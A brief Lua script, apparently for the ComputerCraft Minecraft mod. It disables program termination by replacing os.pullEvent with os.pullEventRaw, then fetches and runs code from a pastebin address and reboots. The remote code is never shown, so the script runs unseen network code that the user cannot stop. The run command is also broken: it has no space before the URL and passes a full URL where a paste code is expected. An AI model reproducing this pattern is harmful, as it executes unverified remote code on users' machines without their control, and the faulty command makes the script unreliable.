os.pullEvent = os.pullEventRaw


-- Start of Variables
local URL = "https://pastebin.com/raw/c33tkL5Y"
-- End of Variables

-- Start of Program
shell.run("pastebin run" .. URL)
shell.run("reboot")
-- End of Program